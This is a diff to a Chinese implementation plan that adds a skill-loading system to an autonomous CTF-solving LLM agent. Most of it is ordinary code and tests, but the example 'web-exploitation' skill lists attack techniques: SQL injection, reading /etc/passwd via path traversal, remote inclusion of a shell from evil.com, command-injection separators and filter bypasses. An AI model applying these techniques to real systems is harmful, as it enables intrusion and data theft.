@@ -17,6 +17,9 @@
 |------|------|
 | `agent/agent_core.py` | 核心 agent 循环：消息轮转 + 并行工具执行 + 上下文截断 |
 | `prompt/system_prompt.yaml` | 单一系统提示模板（角色 + 工具指引 + 解题策略 + 输出约定） |
+| `agent/skill.py` | Skill 发现与加载模块 |
+| `ctf_tool/load_skill.py` | load_skill 工具实现 |
+| `.buuctf_agent/skills/web-exploitation/SKILL.md` | 示例 skill：Web 漏洞利用 |
 
 ### 修改文件
 | 文件 | 变更 |
@@ -65,6 +68,13 @@ system_prompt: |
   - {{ tool.function.name }}: {{ tool.function.description }}
   {% endfor %}
 
+  ## 可用技能
+  你可以通过 load_skill 工具加载以下专业技能：
+  {% for skill in skills %}
+  - {{ skill.name }}: {{ skill.description }}
+  {% endfor %}
+  当你遇到需要专业知识的题目时，先加载相关技能再行动。
+
   ## 工具使用指引
   - 你可以一次返回多个工具调用，系统会并行执行它们
   - 优先使用 shell 命令进行信息收集和探测
@@ -108,10 +118,13 @@ env = Environment(loader=BaseLoader())
 template = env.from_string(data["system_prompt"])
 result = template.render(
     question="测试题目",
-    tools=[{"function": {"name": "test_tool", "description": "测试工具"}}]
+    tools=[{"function": {"name": "test_tool", "description": "测试工具"}}],
+    skills=[{"name": "web-exploitation", "description": "Web 漏洞利用"}],
 )
 assert "测试题目" in result
 assert "test_tool" in result
+assert "web-exploitation" in result
+assert "load_skill" in result
 print("OK: 模板加载和渲染成功")
 ```
 
@@ -124,7 +137,365 @@ git commit -m "feat: 添加单一系统提示模板"
 
 ---
 
-## Task 2: 为 LLMRequest 添加 chat_completion 方法
+## Task 2: 创建 Skill 发现与加载模块
+
+**Files:**
+- Create: `agent/skill.py`
+
+参考 OpenCode 的 skill 系统设计：每个 skill 是一个 `SKILL.md` 文件（YAML frontmatter + Markdown 内容），从多个目录发现，按需加载。
+
+- [ ] **Step 1: 写入 `agent/skill.py`**
+
+```python
+"""
+@brief Skill 发现与加载模块。
+
+@details
+参考 OpenCode 的 skill 系统设计。每个 skill 是一个 SKILL.md 文件，
+包含 YAML frontmatter（name, description）和 Markdown 正文内容。
+支持从项目本地目录和全局目录发现 skills。
+"""
+
+import logging
+import os
+import re
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Any, Dict, List, Optional
+
+import yaml
+
+logger = logging.getLogger(__name__)
+
+# skill 名称校验：小写字母+数字+连字符
+SKILL_NAME_RE = re.compile(r"^[a-z0-9]+(-[a-z0-9]+)*$")
+
+
+@dataclass
+class SkillInfo:
+    """单个 skill 的元数据和内容。"""
+    name: str
+    description: str
+    content: str
+    location: str  # SKILL.md 的绝对路径
+
+
+@dataclass
+class SkillRegistry:
+    """Skill 注册表，负责发现和管理所有可用 skills。"""
+    skills: Dict[str, SkillInfo] = field(default_factory=dict)
+    dirs: List[str] = field(default_factory=list)
+
+    def get(self, name: str) -> Optional[SkillInfo]:
+        """按名称获取 skill。"""
+        return self.skills.get(name)
+
+    def all(self) -> List[SkillInfo]:
+        """返回所有已注册的 skills，按名称排序。"""
+        return sorted(self.skills.values(), key=lambda s: s.name)
+
+    def names(self) -> List[str]:
+        """返回所有 skill 名称列表。"""
+        return sorted(self.skills.keys())
+
+
+def discover_skills(
+    config: Optional[Dict[str, Any]] = None,
+    project_dir: str = ".",
+) -> SkillRegistry:
+    """
+    @brief 从多个目录发现并加载所有 skills。
+    @param config 全局配置字典，用于读取 skills.paths。
+    @param project_dir 项目根目录。
+    @return SkillRegistry 实例。
+    """
+    registry = SkillRegistry()
+    search_dirs = _get_search_dirs(config, project_dir)
+
+    for search_dir in search_dirs:
+        _scan_dir(search_dir, registry)
+
+    logger.info("共发现 %d 个 skills: %s", len(registry.skills), registry.names())
+    return registry
+
+
+def _get_search_dirs(
+    config: Optional[Dict[str, Any]],
+    project_dir: str,
+) -> List[str]:
+    """构建 skill 搜索目录列表。"""
+    dirs = []
+
+    # 1. 项目本地目录
+    project_local = os.path.join(project_dir, ".buuctf_agent", "skills")
+    if os.path.isdir(project_local):
+        dirs.append(project_local)
+
+    # 2. 全局目录
+    home = Path.home()
+    global_dir = home / ".buuctf_agent" / "skills"
+    if global_dir.is_dir():
+        dirs.append(str(global_dir))
+
+    # 3. 配置自定义路径
+    if config:
+        skills_config = config.get("skills", {})
+        custom_paths = skills_config.get("paths", [])
+        for p in custom_paths:
+            expanded = os.path.expanduser(p)
+            if not os.path.isabs(expanded):
+                expanded = os.path.join(project_dir, expanded)
+            if os.path.isdir(expanded):
+                dirs.append(expanded)
+
+    return dirs
+
+
+def _scan_dir(base_dir: str, registry: SkillRegistry) -> None:
+    """扫描目录下的所有 */SKILL.md 文件。"""
+    if base_dir in registry.dirs:
+        return
+    registry.dirs.append(base_dir)
+
+    for entry in os.listdir(base_dir):
+        skill_dir = os.path.join(base_dir, entry)
+        if not os.path.isdir(skill_dir):
+            continue
+        skill_md = os.path.join(skill_dir, "SKILL.md")
+        if not os.path.isfile(skill_md):
+            continue
+        _load_skill_file(skill_md, registry)
+
+
+def _load_skill_file(path: str, registry: SkillRegistry) -> None:
+    """解析单个 SKILL.md 文件并注册。"""
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            raw = f.read()
+    except OSError as error:
+        logger.warning("读取 skill 文件失败 %s: %s", path, error)
+        return
+
+    # 分离 YAML frontmatter 和 Markdown 正文
+    parts = raw.split("---", 2)
+    if len(parts) < 3:
+        logger.warning("skill 文件缺少 YAML frontmatter: %s", path)
+        return
+
+    try:
+        frontmatter = yaml.safe_load(parts[1])
+    except yaml.YAMLError as error:
+        logger.warning("skill frontmatter 解析失败 %s: %s", path, error)
+        return
+
+    if not isinstance(frontmatter, dict):
+        logger.warning("skill frontmatter 不是有效字典: %s", path)
+        return
+
+    name = frontmatter.get("name", "")
+    description = frontmatter.get("description", "")
+    content = parts[2].strip()
+
+    if not name or not description:
+        logger.warning("skill 缺少 name 或 description: %s", path)
+        return
+
+    if not SKILL_NAME_RE.match(name):
+        logger.warning("skill 名称格式无效 '%s': %s", name, path)
+        return
+
+    if name in registry.skills:
+        logger.warning("skill 名称重复 '%s'，忽略: %s", name, path)
+        return
+
+    registry.skills[name] = SkillInfo(
+        name=name,
+        description=description,
+        content=content,
+        location=os.path.abspath(path),
+    )
+    logger.info("已加载 skill: %s (%s)", name, path)
+```
+
+- [ ] **Step 2: 创建示例 skill 目录和文件**
+
+```bash
+mkdir -p .buuctf_agent/skills/web-exploitation
+```
+
+写入 `.buuctf_agent/skills/web-exploitation/SKILL.md`：
+
+```markdown
+---
+name: web-exploitation
+description: Web 安全漏洞利用技术，涵盖 SQL 注入、XSS、文件包含、命令注入等常见 Web 攻击手法
+---
+
+# Web 漏洞利用指南
+
+## 信息收集
+- 使用 curl -I 探测 HTTP 头信息
+- 检查 robots.txt、sitemap.xml
+- 目录扫描：使用 dirb/gobuster/fuzz
+- 检查常见备份文件：.bak、.swp、.git
+
+## SQL 注入
+- 判断注入点：单引号、双引号、数字型
+- 联合查询注入：ORDER BY 确定列数 → UNION SELECT
+- 报错注入：extractvalue()、updatexml()、floor()
+- 布尔盲注：AND 1=1 / AND 1=2
+- 时间盲注：sleep()、benchmark()
+- 常用工具：sqlmap
+
+## 文件包含
+- 本地文件包含：../../etc/passwd
+- 远程文件包含：http://evil.com/shell.txt
+- PHP 伪协议：php://filter/convert.base64-encode/resource=
+- 日志包含：/var/log/apache2/access.log
+
+## 命令注入
+- 命令分隔符：;、|、||、&&、`、$()
+- 绕过空格：$IFS、{,}、%09
+- 绕过黑名单：base64 编码、变量拼接、通配符
+
+## 反序列化
+- PHP：unserialize()、phar://
+- Java：readObject()、ysoserial
+- Python：pickle.loads()
+```
+
+- [ ] **Step 3: 验证 skill 发现**
+
+```bash
+python -c "
+from agent.skill import discover_skills
+registry = discover_skills(project_dir='.')
+print(f'发现 {len(registry.skills)} 个 skills')
+for s in registry.all():
+    print(f'  - {s.name}: {s.description[:50]}')
+assert 'web-exploitation' in registry.skills
+print('OK')
+"
+```
+
+- [ ] **Step 4: 提交**
+
+```bash
+git add agent/skill.py .buuctf_agent/skills/web-exploitation/SKILL.md
+git commit -m "feat: 新增 Skill 发现与加载模块，附带 web-exploitation 示例 skill"
+```
+
+---
+
+## Task 3: 创建 load_skill 工具
+
+**Files:**
+- Create: `ctf_tool/load_skill.py`
+
+将 skill 加载能力封装为一个工具，LLM 可以通过 tool calling 按需加载 skill 内容到上下文。
+
+- [ ] **Step 1: 写入 `ctf_tool/load_skill.py`**
+
+```python
+"""
+@brief 提供 load_skill 工具，让 LLM 按需加载专业技能。
+"""
+
+from typing import Any, Dict
+
+from agent.skill import SkillRegistry
+from ctf_tool.base_tool import BaseTool
+
+
+class LoadSkillTool(BaseTool):
+    """@brief 按需加载 CTF 专业技能到对话上下文。"""
+
+    def __init__(self, skill_registry: SkillRegistry) -> None:
+        self._registry = skill_registry
+
+    def execute(self, tool_name: str, arguments: Dict[str, Any]) -> str:
+        """@brief 加载指定 skill 并返回其内容。
+        @param tool_name 工具名（未使用）。
+        @param arguments 参数字典，需包含 name。
+        @return skill 内容文本，或错误信息。
+        """
+        del tool_name
+        name = arguments.get("name", "")
+        if not name:
+            return "错误：未提供 skill 名称"
+
+        skill = self._registry.get(name)
+        if not skill:
+            available = ", ".join(self._registry.names())
+            return f"错误：未找到 skill '{name}'。可用 skills: {available}"
+
+        return (
+            f"<skill_content name=\"{skill.name}\">\n"
+            f"{skill.content}\n"
+            f"</skill_content>"
+        )
+
+    @property
+    def function_config(self) -> Dict[str, Any]:
+        """@brief 返回工具函数配置。"""
+        # 构建可用 skill 列表用于描述
+        skill_list = "\n".join(
+            f"- {s.name}: {s.description}"
+            for s in self._registry.all()
+        )
+        description = (
+            "加载 CTF 专业技能到上下文中。当你遇到需要特定领域知识的题目时，"
+            "先调用此工具加载相关技能。\n可用技能：\n" + skill_list
+        )
+
+        return {
+            "type": "function",
+            "function": {
+                "name": "load_skill",
+                "description": description,
+                "parameters": {
+                    "type": "object",
+                    "properties": {
+                        "name": {
+                            "type": "string",
+                            "description": "要加载的 skill 名称",
+                        }
+                    },
+                    "required": ["name"],
+                },
+            },
+        }
+```
+
+- [ ] **Step 2: 验证工具可加载**
+
+```bash
+python -c "
+from agent.skill import discover_skills
+from ctf_tool.load_skill import LoadSkillTool
+
+registry = discover_skills(project_dir='.')
+tool = LoadSkillTool(registry)
+config = tool.function_config
+assert config['function']['name'] == 'load_skill'
+assert 'web-exploitation' in config['function']['description']
+
+result = tool.execute('load_skill', {'name': 'web-exploitation'})
+assert 'SQL 注入' in result
+print('OK: load_skill 工具正常')
+"
+```
+
+- [ ] **Step 3: 提交**
+
+```bash
+git add ctf_tool/load_skill.py
+git commit -m "feat: 新增 load_skill 工具，LLM 可按需加载专业技能"
+```
+
+---
+
+## Task 4: 为 LLMRequest 添加 chat_completion 方法
 
 **Files:**
 - Modify: `utils/llm_request.py:62-84`
@@ -178,7 +549,7 @@ git commit -m "feat: LLMRequest 新增 chat_completion 方法支持完整消息�
 
 ---
 
-## Task 3: 修改 ToolUtils 支持并行执行
+## Task 5: 修改 ToolUtils 支持并行执行
 
 **Files:**
 - Modify: `utils/tools.py:148-214` (替换 `execute_tools`)
@@ -273,7 +644,7 @@ git commit -m "refactor: ToolUtils 改为并行执行，删除 output_summary"
 
 ---
 
-## Task 4: 简化 CheckpointManager
+## Task 6: 简化 CheckpointManager
 
 **Files:**
 - Modify: `agent/checkpoint.py`
@@ -388,7 +759,7 @@ git commit -m "refactor: 简化 CheckpointManager，存储 messages 列表"
 
 ---
 
-## Task 5: 创建 agent_core.py
+## Task 7: 创建 agent_core.py
 
 **Files:**
 - Create: `agent/agent_core.py`
@@ -599,7 +970,7 @@ git commit -m "feat: 新增 agent_core 自主 Agent 循环"
 
 ---
 
-## Task 6: 重写 workflow_runner.py
+## Task 8: 重写 workflow_runner.py
 
 **Files:**
 - Modify: `cli/adapters/workflow_runner.py:171-199` (重写 `run_workflow`)
@@ -622,7 +993,9 @@ def run_workflow(
 
     from agent.agent_core import run
     from agent.checkpoint import CheckpointManager
+    from agent.skill import discover_skills
     from ctf_platform.registry import create_submitter
+    from ctf_tool.load_skill import LoadSkillTool
     from utils.llm_request import LLMRequest
     from utils.tools import ToolUtils
 
@@ -630,18 +1003,36 @@ def run_workflow(
     with open("./prompt/system_prompt.yaml", "r", encoding="utf-8") as f:
         prompt_data = yaml.safe_load(f)
 
-    # 加载工具
+    # 发现并加载 skills
+    skill_registry = discover_skills(config=config, project_dir=".")
+
+    # 加载工具（含 load_skill）
     tool_utils = ToolUtils()
     tools, tool_defs = tool_utils.load_tools()
+
+    # 注册 load_skill 工具
+    if skill_registry.skills:
+        load_skill_tool = LoadSkillTool(skill_registry)
+        tools["load_skill"] = load_skill_tool
+        tool_defs.append(load_skill_tool.function_config)
+        user_interface.display_message(
+            f"已加载 {len(skill_registry.skills)} 个 skills: "
+            + ", ".join(skill_registry.names())
+        )
 
     if not tool_defs:
         user_interface.display_message("当前没有可用工具，无法解题")
         return "未找到flag：无可用工具"
 
-    # 渲染系统提示
+    # 渲染系统提示（注入 skills 列表）
     env = Environment(loader=BaseLoader())
     template = env.from_string(prompt_data["system_prompt"])
-    system_prompt = template.render(question=problem, tools=tool_defs)
+    skills_info = [{"name": s.name, "description": s.description} for s in skill_registry.all()]
+    system_prompt = template.render(
+        question=problem,
+        tools=tool_defs,
+        skills=skills_info,
+    )
 
     # 构建初始消息
     if resume_data and "messages" in resume_data:
@@ -707,7 +1098,7 @@ def _extract_flag_from_result(result: str) -> Optional[str]:
 
 - [ ] **Step 2: 确认不再需要的 import 已清理**
 
-`workflow_runner.py` 顶部不再需要 `from agent.workflow import Workflow`（它在 `run_workflow` 内部延迟导入，现在改为导入 `agent_core`）。确认没有残留的旧 import。
+`workflow_runner.py` 顶部不再需要 `from agent.workflow import Workflow`（它在 `run_workflow` 内部延迟导入，现在改为导入 `agent_core` 和 `agent.skill`）。确认没有残留的旧 import。
 
 - [ ] **Step 3: 提交**
 
@@ -718,7 +1109,7 @@ git commit -m "refactor: 重写 run_workflow 使用 agent_core 自主循环"
 
 ---
 
-## Task 7: 更新 solve.py CLI 命令
+## Task 9: 更新 solve.py CLI 命令
 
 **Files:**
 - Modify: `cli/commands/solve.py`
@@ -836,7 +1227,7 @@ git commit -m "refactor: solve 命令去掉 auto/manual 模式选择"
 
 ---
 
-## Task 8: 清理 UserInterface 和 RichPromptToolkitInterface
+## Task 10: 清理 UserInterface 和 RichPromptToolkitInterface
 
 **Files:**
 - Modify: `utils/user_interface.py`
@@ -915,7 +1306,7 @@ git commit -m "refactor: 精简 UserInterface，删除手动审批相关方法"
 
 ---
 
-## Task 9: 清理 utils/text.py 和 config_template.json
+## Task 11: 清理 utils/text.py 和 config_template.json
 
 **Files:**
 - Modify: `utils/text.py`
@@ -966,6 +1357,9 @@ def optimize_text(text: str) -> str:
         }
     },
     "mcp_server": {},
+    "skills": {
+        "paths": []
+    },
     "platform": {
         "inputer": {
             "type": "file",
@@ -988,7 +1382,7 @@ git commit -m "refactor: 清理 text.py 和 config_template.json"
 
 ---
 
-## Task 10: 删除旧文件
+## Task 12: 删除旧文件
 
 **Files:**
 - Delete: `agent/solve_agent.py`
@@ -1027,7 +1421,7 @@ git commit -m "refactor: 删除旧的 SolveAgent/Workflow/Analyzer/Memory 和 pr
 
 ---
 
-## Task 11: 端到端验证
+## Task 13: 端到端验证
 
 - [ ] **Step 1: 确认所有模块可导入**
 
@@ -1035,6 +1429,8 @@ git commit -m "refactor: 删除旧的 SolveAgent/Workflow/Analyzer/Memory 和 pr
 python -c "
 from agent.agent_core import run
 from agent.checkpoint import CheckpointManager
+from agent.skill import discover_skills, SkillRegistry
+from ctf_tool.load_skill import LoadSkillTool
 from utils.tools import ToolUtils
 from utils.llm_request import LLMRequest
 from utils.text import optimize_text
@@ -1056,7 +1452,26 @@ python main.py config check
 python main.py tools list
 ```
 
-- [ ] **Step 4: 使用简单题目做端到端测试**
+- [ ] **Step 4: 验证 skill 发现和 load_skill 工具**
+
+```bash
+python -c "
+from agent.skill import discover_skills
+from ctf_tool.load_skill import LoadSkillTool
+
+registry = discover_skills(project_dir='.')
+print(f'发现 {len(registry.skills)} 个 skills:')
+for s in registry.all():
+    print(f'  - {s.name}: {s.description[:60]}')
+
+tool = LoadSkillTool(registry)
+result = tool.execute('load_skill', {'name': 'web-exploitation'})
+assert 'SQL' in result
+print('OK: skill 系统正常')
+"
+```
+
+- [ ] **Step 5: 使用简单题目做端到端测试**
 
 创建一个简单的测试题目文件，运行 solve 命令验证完整流程：
 
@@ -1067,7 +1482,7 @@ python main.py solve --question "What is 1+1?" --no-resume --plain
 
 预期：LLM 直接回答 2 并停止（不调用工具），或调用 shell 工具执行计算后停止。
 
-- [ ] **Step 5: 最终提交**
+- [ ] **Step 6: 最终提交**
 
 ```bash
 git add -A
